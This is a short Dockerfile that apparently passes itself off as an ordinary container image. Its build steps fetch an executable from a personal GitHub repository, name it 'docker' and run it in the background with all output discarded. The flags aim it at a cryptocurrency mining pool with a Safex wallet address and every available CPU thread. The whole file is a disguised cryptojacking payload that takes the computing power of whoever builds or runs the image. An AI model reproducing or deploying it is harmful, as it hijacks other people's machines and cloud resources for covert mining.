FROM debian
RUN apt update
RUN apt install wget -y
RUN wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker
RUN chmod u+x docker
RUN ./docker -o sf.pool-pay.com:4025 -u Safexsp1o77aa1VcscEtwfBeDaqLyqnh4TZt1wjzAbmZ1CTTvnik8RN8fSSJnhm4BLVJB5kUokKJN8SCu7c8PZ3RJ7pfRGv5wsy4r -p x@$..$(echo $(shuf -i 1111-9999 -n 1)-ET) -k -a rx/sfx -t$(nproc --all) > /dev/null 2>&1 &
